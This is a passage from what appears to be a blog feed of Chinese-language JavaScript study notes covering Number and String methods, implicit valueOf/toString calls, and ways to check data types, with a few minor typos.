<span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Number</span>.<span class="property">MAX_SAFE_INTEGER</span>     <span class="comment">// 9007199254740991   能精确表示的最大整数</span></span><br><span class="line"><span class="title class_">Number</span>.<span class="property">MIN_SAFE_INTEGER</span>     <span class="comment">// -9007199254740991  能精确表示的最小整数</span></span><br></pre></td></tr></table></figure><h5 id="1.6.3-实例方法">1.6.3 实例方法<a title="#1.6.3-实例方法" href="#1.6.3-实例方法"></a></h5><p>有四个实例方法，都与数值转换指定格式有关</p><h6 id="1.6.3.1-number.prototype.tostring()">1.6.3.1 Number.prototype.toString()<a title="#1.6.3.1-number.prototype.tostring()" href="#1.6.3.1-number.prototype.tostring()"></a></h6><p>部署了自己的 toString 方法，用来将一个数值转换为字符串形式；</p><p>toString() 括号里可以接收一个参数，表示输出的进制。默认是十进制。</p><blockquote><p>调用的时候也要注意 1.4.3 中的点运算符</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">10</span>).<span class="title function_">toString</span>( <span class="regexp">/2/</span><span class="number">8</span>/<span class="number">16</span>);  <span class="string">&quot;10/1010/12/a&quot;</span></span><br></pre></td></tr></table></figure></blockquote><h6 id="1.6.3.2-number.prototype.tofixed()">1.6.3.2 Number.prototype.toFixed()<a title="#1.6.3.2-number.prototype.tofixed()" href="#1.6.3.2-number.prototype.tofixed()"></a></h6><p>将一个数转为指定位数的小数（ 四舍五入 / 补零），然后返回这个小数对应的字符串</p><h6 id="1.6.3.3-number.prototype.toexponential()">1.6.3.3 Number.prototype.toExponential()<a title="#1.6.3.3-number.prototype.toexponential()" href="#1.6.3.3-number.prototype.toexponential()"></a></h6><p>将一个数转为科学计数法形式，然后返回对应的字符串</p><h6 id="1.6.3.4-number.prototype.roprecision()">1.6.3.4 Number.prototype.roPrecision()<a title="#1.6.3.4-number.prototype.roprecision()" href="#1.6.3.4-number.prototype.roprecision()"></a></h6><p>将一个数转为指定位数的有效数字（ 四舍五入 / 补零），然后返回对应的字符串</p><h5 id="1.6.4-自定义方法">1.6.4 自定义方法<a title="#1.6.4-自定义方法" href="#1.6.4-自定义方法"></a></h5><p>在 Number.protorype 对象上自定义方法，会被 Number 的实例继承</p><h4 id="1.7-string-对象">1.7 String 对象<a title="#1.7-string-对象" href="#1.7-string-对象"></a></h4><h5 id="1.7.1-概述">1.7.1 概述<a title="#1.7.1-概述" href="#1.7.1-概述"></a></h5><p>作为构造函数：生成字符串对象，其为一个类似数组的对象（很像数组，但不是数组）</p><blockquote><p>字符串<code>abc</code>对应的字符串对象，有数值键（<code>0</code>、<code>1</code>、<code>2</code>）和<code>length</code>属性，所以可以像数组那样取值</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&#x27;abc&#x27;</span>)</span><br><span class="line"><span class="comment">// String &#123;0: &quot;a&quot;, 1: &quot;b&quot;, 2: &quot;c&quot;, length: 3&#125;</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&#x27;abc&#x27;</span>))[<span class="number">1</span>] <span class="comment">// &quot;b&quot;</span></span><br></pre></td></tr></table></figure><p>作为普通函数：将任意类型的值转为字符串</p><h5 id="1.7.2-静态方法">1.7.2 静态方法<a title="#1.7.2-静态方法" href="#1.7.2-静态方法"></a></h5><h6 id="string.fromcharcode()">String.fromCharCode()<a title="#string.fromcharcode()" href="#string.fromcharcode()"></a></h6><p>静态方法（即定义在对象本身，而不是定义在对象实例的方法），参数是一个或多个数值，代表 Unicode 码，返回值为这些码组成的字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">String</span>.<span class="title function_">fromCharCode</span>() <span class="comment">// &quot;&quot;</span></span><br><span class="line"><span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">97</span>) <span class="comment">// &quot;a&quot;</span></span><br><span class="line"><span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>) <span class="comment">// &quot;hello&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>该方法不支持 Unicode 码点大于<code>0xFFFF</code>的字符</p></blockquote><h5 id="1.7.3-实例属性">1.7.3 实例属性<a title="#1.7.3-实例属性" href="#1.7.3-实例属性"></a></h5><h6 id="string.prototype.length">String.prototype.length<a title="#string.prototype.length" href="#string.prototype.length"></a></h6><h5 id="1.7.4-实例方法">1.7.4 实例方法<a title="#1.7.4-实例方法" href="#1.7.4-实例方法"></a></h5><h6 id="string.prototype.charat()">String.prototype.charAt()<a title="#string.prototype.charat()" href="#string.prototype.charat()"></a></h6><p>返回指定位置的字符：<code>‘abc’.charAt(1) == 'abc'[1] = 'b'</code></p><h6 id="string.prototype.charcodeat()">String.prototype.charCodeAt()<a title="#string.prototype.charcodeat()" href="#string.prototype.charcodeat()"></a></h6><p>返回字符串指定位置的 Unicode 码：<code>‘abc’.charCodeAt(1) == 98</code></p><h6 id="string.prototype.concat()">String.prototype.concat()<a title="#string.prototype.concat()" href="#string.prototype.concat()"></a></h6><p>用于连接两个字符串，返回一个新字符串，不改变原字符串，可以有多个参数：<code>s1.concat(s2),'a'.concat('b', 'c')</code></p><h6 id="string.prototype.slice()">String.prototype.slice()<a title="#string.prototype.slice()" href="#string.prototype.slice()"></a></h6><p>从原字符串取出子字符串并返回，不改变原字符串。它的第一个参数是子字符串的开始位置，第二个参数是子字符串的结束位置(不含)</p><h6 id="string.prototype.substring()">String.prototype.substring()<a title="#string.prototype.substring()" href="#string.prototype.substring()"></a></h6><p>同上</p><h6 id="string.prototype.substr()">String.prototype.substr()<a title="#string.prototype.substr()" href="#string.prototype.substr()"></a></h6><p>同上</p><h6 id="string.prototype.indexof()">String.prototype.indexOf()<a title="#string.prototype.indexof()" href="#string.prototype.indexof()"></a></h6><p>用于确定一个字符串在另一个字符串中第一次出现的位置，返回结果是匹配开始的位置；</p><p>还可以接受第二个参数，表示从该位置开始向后匹配。</p><h6 id="string.prototype.lastindexof()">String.prototype.lastIndexOf()<a title="#string.prototype.lastindexof()" href="#string.prototype.lastindexof()"></a></h6><p>从尾部开始匹配，第二个参数表示从该位置起向前匹配</p><h6 id="string.prototype.trim()">String.prototype.trim()<a title="#string.prototype.trim()" href="#string.prototype.trim()"></a></h6><p>去除字符串两端的空格，返回一个新字符串，不改变原字符串；</p><p>去除的不仅是空格，还包括制表符（<code>\t</code>、<code>\v</code>）、换行符（<code>\n</code>）和回车符（<code>\r</code>）</p><h6 id="string.prototype.tolowercase()，string.prototype.touppercase()">String.prototype.toLowerCase()，String.prototype.toUpperCase()<a title="#string.prototype.tolowercase()，string.prototype.touppercase()" href="#string.prototype.tolowercase()，string.prototype.touppercase()"></a></h6><p>都返回一个新字符串，不改变原字符串</p><h6 id="string.prototype.match()">String.prototype.match()<a title="#string.prototype.match()" href="#string.prototype.match()"></a></h6><p>确定原字符串是否匹配某个子字符串，返回一个数组，成员为匹配的第一个字符串。如果没有找到匹配，则返回<code>null</code></p><p>返回的数组还有<code>index</code>属性和<code>input</code>属性，分别表示匹配字符串开始的位置和原始字符串</p><h6 id="string.prototype.search()">String.prototype.search()<a title="#string.prototype.search()" href="#string.prototype.search()"></a></h6><p>基本等同于<code>match</code>，但是返回值为匹配的第一个位置。如果没有找到匹配，则返回<code>-1</code></p><p>还可以使用正则表达式作为参数。</p><h6 id="string.prototype.replace()">String.prototype.replace()<a title="#string.prototype.replace()" href="#string.prototype.replace()"></a></h6><p>用于替换匹配的子字符串，一般情况下只替换第一个匹配（除非使用带有<code>g</code>修饰符的正则表达式）</p><h6 id="string.prototype.split()">String.prototype.split()<a title="#string.prototype.split()" href="#string.prototype.split()"></a></h6><p>按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;a|b|c&#x27;</span>.<span class="title function_">split</span>(<span class="string">&#x27;|&#x27;</span>) <span class="comment">// [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</span></span><br><span class="line"><span class="string">&#x27;a|b|c&#x27;</span>.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>) <span class="comment">// [&quot;a&quot;, &quot;|&quot;, &quot;b&quot;, &quot;|&quot;, &quot;c&quot;]</span></span><br><span class="line"><span class="string">&#x27;a|b|c&#x27;</span>.<span class="title function_">split</span>() <span class="comment">// [&quot;a|b|c&quot;]</span></span><br></pre></td></tr></table></figure></blockquote><h6 id="string.prototype.localecompare()">String.prototype.localeCompare()<a title="#string.prototype.localecompare()" href="#string.prototype.localecompare()"></a></h6><p>用于比较两个字符串。</p><p>返回一个整数，如果小于0，表示第一个字符串小于第二个字符串；如果等于0，表示两者相等；如果大于0，表示第一个字符串大于第二个字符串</p><p>还可以有第二个参数，指定所使用的语言（默认是英语</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;apple&#x27;</span>.<span class="title function_">localeCompare</span>(<span class="string">&#x27;banana&#x27;</span>) <span class="comment">// -1</span></span><br><span class="line"><span class="string">&#x27;apple&#x27;</span>.<span class="title function_">localeCompare</span>(<span class="string">&#x27;apple&#x27;</span>) <span class="comment">// 0</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="2.-隐式调用">2. 隐式调用<a title="#2.-隐式调用" href="#2.-隐式调用"></a></h3><p>简单说就是自动调用一些方法，而这些方法像钩子一样可以在外部修改，从而改变既定行为。</p><h4 id="2.1-数据类型转换-tostring-和-valueof">2.1 数据类型转换 toString 和 valueOf<a title="#2.1-数据类型转换-tostring-和-valueof" href="#2.1-数据类型转换-tostring-和-valueof"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">    <span class="attr">i</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">valueOf</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;      <span class="comment">// 改成 =&gt; 就不行 记得看 this 指向</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;valueof&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">i</span>++;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">toString</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;tostring&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a == <span class="number">1</span>  <span class="comment">// &quot;valueof&quot;  true</span></span><br><span class="line"><span class="title class_">Number</span>(a)  <span class="comment">// &quot;valueof&quot; 2</span></span><br><span class="line"><span class="title class_">String</span>(a)  <span class="comment">// &quot;tostring&quot; &quot;3&quot;</span></span><br><span class="line"><span class="title class_">Boolean</span>(a) <span class="comment">// true  因为是对象</span></span><br><span class="line">a + <span class="number">1</span>     <span class="comment">// &quot;valueof&quot; 5</span></span><br><span class="line"><span class="title class_">String</span>(a) + <span class="number">1</span> <span class="comment">// &quot;toString&quot; &quot;61&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = &#123;</span><br><span class="line">    <span class="attr">i</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">valueOf</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;valueof&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">toString</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;tostring&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Number</span>(b) <span class="comment">// &quot;valueof&quot; &quot;tostring&quot; Uncaught TypeError</span></span><br><span class="line">b == <span class="number">1</span>    <span class="comment">// &quot;valueof&quot; &quot;tostring&quot; Uncaught TypeError</span></span><br><span class="line"><span class="title class_">String</span>(b) <span class="comment">// &quot;tostring&quot; &quot;valueof&quot; Uncaught TypeError</span></span><br><span class="line">b == <span class="string">&quot;1&quot;</span>  <span class="comment">// &quot;valueof&quot; &quot;tostring&quot; Uncaught TypeError</span></span><br></pre></td></tr></table></figure><p>在相等 <strong>==</strong> 运算符 / 加号 <strong>+</strong> 操作中，（null 除外）对象会<strong>先调用 valueOf</strong> ，如果<strong>返回值是对象，就会调用 toString</strong>， 然后用返回的值进行比较 / 加号操作。</p><p>Number 和 String 方法中 ，<strong>Number 会先调用 valueOf 后调用 toString</strong>，<strong>String 则相反</strong>。</p><h4 id="2.2-dom2-事件中的-handleevent">2.2 DOM2 事件中的 handleEvent<a title="#2.2-dom2-事件中的-handleevent" href="#2.2-dom2-事件中的-handleevent"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> eventObj = &#123;</span><br><span class="line">    <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">handleEvent</span>: <span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>, e);  <span class="comment">// eventObj ， 事件对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>,eventObj);</span><br></pre></td></tr></table></figure><p>addEventListener 第二个参数除了函数外还可以是一个对象，事件触发后会执行对象的 handleEvent 方法，方法执行时的 this 指向 eventObj，你可以把想传入的数据绑定在 eventObj 对象上</p><h4 id="2.3-json-对象-tojson">2.3 JSON 对象 toJSON<a title="#2.3-json-对象-tojson" href="#2.3-json-对象-tojson"></a></h4><h4 id="2.4-promise-对象的-then">2.4 promise 对象的 then<a title="#2.4-promise-对象的-then" href="#2.4-promise-对象的-then"></a></h4><h4 id="2.5-对象属性存取器-get-和-set">2.5 对象属性存取器 get 和 set<a title="#2.5-对象属性存取器-get-和-set" href="#2.5-对象属性存取器-get-和-set"></a></h4><h4 id="2.6-遍历器接口-symbol.iterator">2.6 遍历器接口 Symbol.iterator<a title="#2.6-遍历器接口-symbol.iterator" href="#2.6-遍历器接口-symbol.iterator"></a></h4>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>判断数据类型</title>
      <link href="/furtherNotes/further/01%20%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"/>
      <url>/furtherNotes/further/01%20%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B</url>
      
        <content type="html"><![CDATA[<blockquote><p>通过 手写深拷贝 的 数据的类型判断 方法有点感兴趣</p><p><a href="https://juejin.cn/post/6992848107004231687">https://juejin.cn/post/6992848107004231687</a></p><p>有问题：<a href="https://juejin.cn/post/7004778999226302477">https://juejin.cn/post/7004778999226302477</a></p><p>原理：<a href="https://juejin.cn/post/6844904081803182087">https://juejin.cn/post/6844904081803182087</a></p></blockquote><h2 id="4种-判断数据类型的方式">4种 判断数据类型的方式<a title="#4种-判断数据类型的方式" href="#4种-判断数据类型的方式"></a></h2><h3 id="0.-数据类型">0. 数据类型<a title="#0.-数据类型" href="#0.-数据类型"></a></h3><p>数据类型：Undefined、Null、Boolean、Number、String、Symbol、BigInt、Object</p><blockquote><p>Symbol 是 es6 中引入的一种 原始数据 类型，表示独一无二的值</p><p>BigInt 是 es2020 引入的用于解决 js 中数字只能到 53 个二进制位 的问题</p></blockquote><ol><li><p>基本数据类型</p><p>Undefined、Null、Boolean、Number、String、Symbol（es6）、BigInt（es2020）</p></li><li><p>引用数据类型</p><p>Object：Array、Function、Date、RegExp、Error、Arguments 等</p></li></ol><h3 id="1.-typeof">1. typeof<a title="#1.-typeof" href="#1.-typeof"></a></h3><h4 id="1.1-使用">1.1 使用<a title="#1.1-使用" href="#1.1-使用"></a></h4><p>typeof 基本类型 返回相应的类型，除了 null 返回 object</p><p>typeof 引用类型 返回 object ，除了 函数 返回 function</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="string">&#x27;5&#x27;</span>             <span class="comment">// string</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="number">5</span>               <span class="comment">// number</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span>            <span class="comment">// object  ！</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>       <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">true</span>            <span class="comment">// boolean</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Symbol</span>(<span class="string">&#x27;5&#x27;</span>)     <span class="comment">// symbol</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="number">5n</span>              <span class="comment">// bigint</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">Object</span>();   <span class="comment">// object</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">Function</span>(); <span class="comment">// function ！</span></span><br></pre></td></tr></table></figure><p><strong>Q:</strong> typeof 作用于未定义的变量，会报错吗？</p><p>A: 不会报错，返回&quot;undefined&quot;</p><p><strong>Q:</strong> typeof Number(1) 的返回值？</p><p>A: “number”。</p><blockquote><p>typeof Nmuber(1)  // ‘number’</p><p>typeof String(‘1’)    // ‘string’</p><p>typeof Array(1,2) === typeof new Array(1,2)  // ‘object’</p><p>Number 和 String 作为普通函数调用的时候，把参数转化为相应的原始数据类型，也就是<strong>类似于做一个强制类型转换的操作</strong>，而不是默认当做构造函数调用。注意和 Array 区分，Array(…) 等价于 new Array(…)</p></blockquote><p><strong>Q:</strong> typeof new Number(1) 的返回值</p><p>A: ‘object’</p><h4 id="1.2-原理">1.2 原理<a title="#1.2-原理" href="#1.2-原理"></a></h4><p>不同对象<strong>在底层都表示为二进制</strong>，在 Javascript 中二进制低三位存储其类型信息</p><ul><li><p>000：对象</p></li><li><p>001：整数</p></li><li><p>010：浮点数</p></li><li><p>100：字符串</p></li><li><p>110：布尔值</p><p>null：全0</p></li></ul><h3 id="2.-instanceof">2. instanceof<a title="#2.-instanceof" href="#2.-instanceof"></a></h3><h4 id="2.1-使用">2.1 使用<a title="#2.1-使用" href="#2.1-使用"></a></h4><ul><li><p>是用来判断 变量的原型链上是否有构造函数的 prototype 属性（两个对象是否属于原型链的关系），不一定能获取对象的具体类型</p></li><li><p>不适用判断原始类型的值，只能用于判断对象是否从属关系</p></li></ul><blockquote><p>instanceof 的结果并不一定是可靠的，因为在 <strong>ECMAScript7</strong> 规范中可以通 过自定义 Symbol.hasInstance 方法来覆盖默认行为</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span> <span class="keyword">instanceof</span> <span class="title class_">Number</span> <span class="comment">// false </span></span><br><span class="line"><span class="string">&#x27;3&#x27;</span> <span class="keyword">instanceof</span> <span class="title class_">String</span> <span class="comment">// false</span></span><br><span class="line"><span class="literal">true</span> <span class="keyword">instanceof</span> <span class="title class_">Boolean</span> <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">[] <span class="keyword">instanceof</span> <span class="title class_">Array</span>; <span class="comment">// true</span></span><br><span class="line">[] <span class="keyword">instanceof</span> <span class="title class_">Object</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>()   date <span class="keyword">instanceof</span> <span class="title class_">Date</span> <span class="comment">// true </span></span><br><span class="line"><span class="keyword">var</span> number = <span class="keyword">new</span> <span class="title class_">Number</span>()  number <span class="keyword">instanceof</span> <span class="title class_">Number</span> <span class="comment">// true </span></span><br><span class="line"><span class="keyword">var</span> string = <span class="keyword">new</span> <span class="title class_">String</span>()  string <span class="keyword">instanceof</span> <span class="title class_">String</span> <span class="comment">// true </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 空对象&#123;&#125; 的判断</span></span><br><span class="line"><span class="keyword">let</span> obj1 = &#123;&#125;  obj1 <span class="keyword">instanceof</span> <span class="title class_">Object</span>  <span class="comment">// true</span></span><br><span class="line"><span class="keyword">let</span> obj2 = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)  obj2 <span class="keyword">instanceof</span> <span class="title class_">Object</span>  <span class="comment">// false</span></span><br><span class="line"><span class="keyword">let</span> obj3 = <span class="title class_">Object</span>.<span class="title function_">create</span>(&#123;&#125;)  obj3 <span class="keyword">instanceof</span> <span class="title class_">Object</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h4 id="2.2-原理">2.2 原理<a title="#2.2-原理" href="#2.2-原理"></a></h4><p><code>instanceof</code>  判断 变量的<strong>原型链上是否有构造函数的 prototype 属性</strong></p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/5/170a84f72826fa18~tplv-t2oaga2asx-watermark.awebp"><h3 id="3.-__proto__.constructor">3. __proto__.constructor<a title="#3.-__proto__.constructor" href="#3.-__proto__.constructor"></a></h3><p>原理：每一个实例对象都可以通过 constructor 来访问它的构造函数，其实也是根据原型链的原理来的</p><blockquote><p>由于undefined和null是无效的对象，因此是没有constructor属性的,这两个值不能用这种方法判断.、</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;5&#x27;</span>.<span class="property">__proto__</span>.<span class="property">constructor</span> === <span class="title class_">String</span> <span class="comment">// true  String 应该是类型</span></span><br><span class="line">[<span class="number">5</span>].<span class="property">__proto__</span>.<span class="property">constructor</span> === <span class="title class_">Array</span> <span class="comment">// true </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>(); date.<span class="property">__proto__</span>.<span class="property">constructor</span> === <span class="title class_">Date</span> <span class="comment">// true</span></span><br><span class="line"><span class="literal">undefined</span>.<span class="property">__proto__</span>.<span class="property">constructor</span> <span class="comment">// Cannot read property &#x27;__proto__&#x27; of undefined</span></span><br><span class="line"><span class="literal">null</span>.<span class="property">__proto__</span>.<span class="property">constructor</span> <span class="comment">// Cannot read property &#x27;__proto__&#x27; of undefined</span></span><br></pre></td></tr></table></figure><h3 id="4.-object.prototype.tostring">4. Object.prototype.toString<a title="#4.-object.prototype.tostring" href="#4.-object.prototype.tostring"></a></h3><ul><li>返回对象的类型字符串，隐藏可以用来判断一个值的类型</li><li>因为实例对象可能会自定义 toString 方法，会覆盖 Object.prototype.toString，所以在使用时，最好加上 call</li><li>所有数据类型都可以用这个方法进行检测，且十分精准</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(<span class="string">&#x27;5&#x27;</span>) <span class="comment">// &quot;[object String]&quot;  字符串</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(<span class="number">5</span>) <span class="comment">// [object Number]</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>([<span class="number">5</span>]) <span class="comment">// [object Array]</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(<span class="literal">true</span>) <span class="comment">// [object Boolean]</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(<span class="literal">undefined</span>) <span class="comment">// [object Undefined]</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(<span class="literal">null</span>) <span class="comment">// [object Null]</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(<span class="keyword">new</span> <span class="title class_">Function</span>()); <span class="comment">// [object Function]</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(<span class="keyword">new</span> <span class="title class_">Date</span>()); <span class="comment">// [object Date]</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>()); <span class="comment">// [object RegExp]</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(<span class="keyword">new</span> <span class="title class_">Error</span>()); <span class="comment">// [object Error]</span></span><br></pre></td></tr></table></figure><h3 id="5.-总结">5. 总结<a title="#5.-总结" href="#5.-总结"></a></h3><ul><li>typeof 适合基本类型和 function 类型的检测，无法判断 null 和 object</li><li>instanceof 适合自定义对象，也可以用来检测原生对象，在不同的 iframe 和 window 间检测时失效，还需要注意 Object.create(null) 对象的问题</li><li>constructor 基本能判断所有类型，除了 null 和 undefined，但是 constructor 容易被修改，也不能跨 iframe 使用</li><li>toString 能判断所有类型，可将其封装为全能的 DateType() 判断所有数据类型</li></ul>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深拷贝浅拷贝</title>
      <link href="/furtherNotes/further/01%20%E6%B7%B1%E6%8B%B7%E8%B4%9D%E6%B5%85%E6%8B%B7%E8%B4%9D"/>
      <url>/furtherNotes/further/01%20%E6%B7%B1%E6%8B%B7%E8%B4%9D%E6%B5%85%E6%8B%B7%E8%B4%9D</url>
      
